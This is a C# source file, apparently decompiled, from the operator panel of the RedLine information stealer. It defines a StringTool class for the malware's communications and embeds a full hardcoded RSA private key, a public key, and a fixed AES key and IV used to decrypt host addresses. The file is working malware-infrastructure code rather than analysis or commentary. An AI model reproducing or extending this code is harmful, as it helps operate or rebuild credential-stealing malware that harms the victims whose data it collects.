using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RedLine.MainPanel.Models.Communication;

public static class StringTool
{
	public static string Get(string strEntryText)
	{
		try
		{
			string xmlString = "<RSAKeyValue><Modulus>t9mfgtxMujxVSGreV7soMZUruHqJ8Hj13V4L++/9Oke+v65Mg8vebywwYt4aLdvMuiZO9SJqFSE1E6rRfc4H+hNh7/2APgF5Q3vw9FJDBNo33H65Hsbr5U9725HpSfRiKP3NQteYjEg0ZuK2g+8+YPbtvdAVkHY594iyUq5jv6DlY5rcridLVfawtisYfxeKGvop2RL7JAZrcajJHuqKSrrXJAbD9wM+Y9zhOZkm6WFI2o1pkj3eilZ/MSOR4gXcngunjzl1wXTMlOVASHw9kkUIz1xg8DCRIXQGwzSDADa+SHp2ICKXkBP52rvzi/ybqP9wL3pc20BP9BYlNlcNYQ==</Modulus><Exponent>AQAB</Exponent><P>3v6wPATWAaBV4H4+6Z6RiULRI2Fadqe78GmhxzXsQhFk50Yy4OysJ/sDZVgia/zFQqSNGePU5GEyp30BhVs+PKS48vXdt1c8XRxcVFdUxI+WQdaENdYIzKcAobNW6oHfB7jJT8nsVdMXG4+0qaV979wyY+HTVV24isOyKg5Fj8s=</P><Q>0w+7gcCMgd0ZNNG6FI0HJK1PT6mT3iy8zjYmwcnz7P2IAbEqbL5wT1WfJv3yJIcKguyxCa5dgfWMeiJNd897bUlt1fynzIsYVLzTxkFD6nyoZg9XeYXwDEprLtYUu4DD1cJmoZ5f8WgjYIWToItfZgMCwPUWOB5AUAuOuJPLWgM=</Q><DP>hmwdLHD12JEgc21m20ldDdMbYyqCb9h48FmczgtxWfpGSywD65Z/yLIFwAe66EG9X4j2Dc9LPEhjUpeGXS89ey0I2FzhxG1v0+kOt0DVto+f0hxQImvdbhCVzuPe1wpmua7om5JrRukymsir7T/3hKnGLnOpA2K1peCF+9gSkrU=</DP><DQ>Cayi76OfzSQRT7Z9TQvZ0/iNth0Txg9O6DTbOe7D240TeuBgDXP9OeW20da6DqqR9MZcpxDzAE39DmwcGO3NvoirHC/kkR+fEeNF4cSEFG96WJNDczKMekO+/fqaIK4aS+YJRkc4JpybYoU86xL4YHiq26VgS1o3oHOnKxa7L3k=</DQ><InverseQ>o5sfKWGDeLr2VeQx7O4ptDMel66t8/0yJO0tewAqnPYgKcrLVmEX2NnxkB5VI6/je8qG2hdI+BBlGFNyAifwB/84RNfPxNipj12MW/zqkut0arcEWtC9hcn2Q7hZO/4PG+eeXYjwWQ+waADnWqj1JvP3ccqz2arakTvCDJAe4RY=</InverseQ><D>IDaOX2RwQTVvD/hBqweM/FsRxQobfzoCgl4HJYagTQTjJDzLBVDEUaBhfgFCfwSDM56guQzln3wpC6AjgrKF7UhWIbG+NZ8Wez+NMZH0UjZWEVlW4FCkZpJttkQzpxSd2mbV/z89aF8CZ4CT0DwsJts9PsPl82DzuS6HaDtMGPgxC1ztQoWwKn1gOiDPQg/5TbzF7gq35TqCrGdpdMbgw3LKp6KtqpDuEq1m0FKb84HyifbM4hcgYZHFAFdKE2/TdcRZSQWyfJDofjk4OEBb6ZnWgzNcagb1S900ex15syik+/Nxm7B+dM+C3QTuCJxLIxdB6mu9GgmwOdrwBoDfnQ==</D></RSAKeyValue>";
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(xmlString);
			byte[] rgb = Convert.FromBase64String(strEntryText);
			byte[] bytes = rSACryptoServiceProvider.Decrypt(rgb, fOAEP: false);
			string @string = Encoding.UTF8.GetString(bytes);
			string text = "";
			return @string.Substring(0, @string.Length - text.Length);
		}
		catch
		{
			return null;
		}
	}

	public static string Set(string strText)
	{
		try
		{
			string xmlString = "<RSAKeyValue><Modulus>4kPe5YKpQJOG6n+ksH1hb541xRFlWdXKE3Gg09YunDKa8mBgOumKttbEM3R/53/RwNO8sqnhEaa4lTAJKR/4bm5TLk5reZ9kuj0zaLV4LcjiHWYz0XKEBmiNdApe2EYrkRybT0YNLu/xEoBrlpmLQOME9h03rnx9JF8i1d7FkKoJTqOGAQtMNjeStKaYO3j/3etOPT25oCi2MT/k3n/pRtGsqrZi86vZ6sNipszRYTNdXrO896FdW0n/hi7Sd6zdiNGUcpFbC6cUetZWOvXeuuDkIpEnkEY19+ZNWfZp4MrBBvK3CQfWl9IbVYZqF/xSnNs/Kf8B/abZ0ooWb93AQQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(xmlString);
			byte[] bytes = Encoding.UTF8.GetBytes(strText ?? "");
			return Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false));
		}
		catch
		{
			return null;
		}
	}

	public static void GenerateKeys(out byte[] key, out byte[] iv)
	{
		using Aes aes = Aes.Create();
		aes.Padding = PaddingMode.PKCS7;
		aes.Mode = CipherMode.CBC;
		aes.GenerateKey();
		aes.GenerateIV();
		key = aes.Key;
		iv = aes.IV;
	}

	public static string Get(byte[] cipher, byte[] Key, byte[] IV)
	{
		try
		{
			using Aes aes = Aes.Create();
			aes.Padding = PaddingMode.PKCS7;
			aes.Mode = CipherMode.CBC;
			ICryptoTransform transform = aes.CreateDecryptor(Key, IV);
			using MemoryStream stream = new MemoryStream(cipher);
			using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
			using StreamReader streamReader = new StreamReader(stream2);
			return streamReader.ReadToEnd();
		}
		catch
		{
			return null;
		}
	}

	public static string DecryptHosts(string cipher)
	{
		using Aes aes = Aes.Create();
		aes.Padding = PaddingMode.PKCS7;
		aes.Mode = CipherMode.CBC;
		ICryptoTransform transform = aes.CreateDecryptor(Convert.FromBase64String("UcblLtkJ+Wsaw2pIk8XvEL+e4N9HkQiF/pHEcaeX18E="), Convert.FromBase64String("RH4NsvODKSpfn0rNZAf5ZA=="));
		using MemoryStream stream = new MemoryStream(Convert.FromBase64String(cipher));
		using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
		using StreamReader streamReader = new StreamReader(stream2);
		return streamReader.ReadToEnd();
	}
}
